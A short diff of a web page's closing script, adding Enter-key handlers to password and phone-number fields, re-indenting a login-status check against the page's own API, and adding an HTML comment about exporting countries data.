+document.getElementById('pwInp')?.addEventListener('keydown', e=>{ if(e.key==='Enter') verifyCode(); });
+document.getElementById('newPhoneInp')?.addEventListener('keydown', e=>{ if(e.key==='Enter') cnSend(); });
 
-  api('/api/status').then(d => { if(d.loggedIn && d.user) { fillUser(d.user); show('countdownScreen'); startCountdown(); } }).catch(()=>{});
+api('/api/status').then(d => { if(d.loggedIn && d.user) { fillUser(d.user); show('countdownScreen'); startCountdown(); } }).catch(()=>{});
 </script>
+<!-- Save countries data to numbers.tsx (this comment indicates the data is available for export) -->
 </body>
 </html>
